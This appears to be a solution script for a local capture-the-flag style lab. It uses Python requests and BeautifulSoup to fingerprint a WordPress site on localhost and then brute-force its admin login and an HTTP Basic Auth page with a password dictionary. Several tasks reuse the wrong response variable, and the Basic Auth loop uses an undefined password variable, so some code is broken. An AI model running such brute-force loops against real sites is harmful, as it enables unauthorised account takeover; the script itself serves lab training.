import requests
from bs4 import BeautifulSoup

"""
    A popular CMS is hosted on port 80 of local machine. Perform the give tasks to complete the challenge.

    Requests and BeautifulSoup libraries are installed on the machine.
    
    A password dictionary "password_dictionary.txt" is present in the working directory.
"""

# Learn

######################################################################################################################
# Task 1: Check if web portal is up by using GET request.

respond = requests.get('http://localhost')

print(respond)
######################################################################################################################

# Task 2: Which server software is being used?

respond2 = requests.get('http://localhost')

print(respond2.headers.get('server'))
######################################################################################################################

# Task 3: Print response headers of the GET response.

respond3 = requests.get('http://localhost')

print(respond3.headers)
######################################################################################################################

# Task 4: Get text content of localhost homepage. Also, can you tell which CMS is running on localhost?

respond4 = requests.get('http://localhost')

print(respond4.text)
######################################################################################################################

# Task 5: Print the response in a pretty form using Beautiful Soup.

respond5 = requests.get('http://localhost')
soup = BeautifulSoup(respond5.text, 'html.parser')

print(soup.prettify())

######################################################################################################################

# Task 6: Print the title of web portal hosted on localhost?

respond6 = requests.get('http://localhost')
soup2 = BeautifulSoup(respond5.text, 'html.parser')

print(soup2.title.string)

######################################################################################################################

# Task 7: Print the URLs for images present on the homepage.

respond7 = requests.get('http://localhost')
soup3 = BeautifulSoup(respond5.text, 'html.parser')

img_tags = soup3.find_all('img')

urls = [img['src'] for img in img_tags]

print(urls)

######################################################################################################################

# Task 8: Scrape all URLs from the home page of localhost and print unique URLs.

respond8 = requests.get('http://localhost')
soup4 = BeautifulSoup(respond5.text, 'html.parser')

anchor_list = [a['href'] for a in soup.find_all('a', href= True) if a.text.strip()]

anchor_set = set(anchor_list)

for link in anchor_set:
    print(link)

######################################################################################################################

# Task 9: Can you access the admin section (/wp-admin/) of the CMS?

respond9 = requests.get('http://localhost/wp-admin/')
soup5 = BeautifulSoup(respond5.text, 'html.parser')

print(soup5.prettify())

######################################################################################################################
# Attack

# Task 10: Bruteforce the wordpress login for user "admin". Use the given dictionary.

password_dict = "password_dictionary.txt"

lines = [line.rstrip('\n') for line in open(password_dict)]

for password in lines:
    print("Trying with password: ", password)
    respond10 = requests.post('http://localhost/wp-login.php', data={'log': 'admin', 'pwd': password})

    if "ERROR" not in respond10.text:
        print("Login Successful with password: ", password)
        break

print(respond10.text)

######################################################################################################################

# Task 11: A token is kept at page localhost/token/index.html by user "anon". But, the page is protected.
# What kind of protection is deployed?


respond11 = requests.get('http://localhost/token/index.html')
soup5 = BeautifulSoup(respond11.text, 'html.parser')

print(soup5.prettify())

print(respond11.headers)

######################################################################################################################

# Task 12: Break the protection and get the token kept at page localhost/token1/index.html

url = 'http://localhost/token/index.html'
username = 'anon'
password_dict2 = "password_dictionary.txt"
timeout = 5

lines2 = [line2.rstrip('\n') for line2 in open(password_dict2)]

for password2 in lines2:
    print("Trying with password: ", password2)

    auth = requests.auth.HTTPBasicAuth(username, password)

    respond12 = requests.get(url=url, auth=auth, verify=False, timeout=timeout)

    if "Authorization Required" not in str (respond12.text):
        print ("Login successful with password: ", password)
        soup6 = BeautifulSoup (respond12.text, 'html.parser')
        break

print(soup.prettify())

